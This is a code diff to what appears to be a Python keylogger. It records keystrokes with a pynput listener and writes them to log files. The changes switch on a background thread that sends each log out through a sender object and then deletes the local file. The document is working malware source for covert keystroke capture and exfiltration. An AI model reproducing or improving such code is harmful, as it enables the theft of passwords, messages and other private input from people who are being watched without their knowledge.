@@ -137,7 +137,7 @@ def write_file():
     d_file.append(file)
 
     # Writes Data to logs
-    with open(file, 'w') as fp:
+    with open(file, 'w', encoding='utf-8') as fp:
         for key in log_data:
             k = str(key).replace("'", "")
             #  Comment out "Key.space, ' '," in sublist for every word typed to be on a new line.
@@ -165,8 +165,9 @@ def send_logs():
     while True:
         if len(log_data) > 1:
             try:
-                print(d_file[0])
+                write_file()
                 sender.send_file(d_file[0])
+                time.sleep(5)
                 os.remove(d_file[0])
                 del log_data[1:]
                 del d_file[0:]
@@ -182,8 +183,8 @@ def send_logs():
 
 # Start Listener
 if __name__ == '__main__':
-    #T1 = threading.Thread(target=send_logs)
-    #T1.start()
+    T1 = threading.Thread(target=send_logs)
+    T1.start()
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
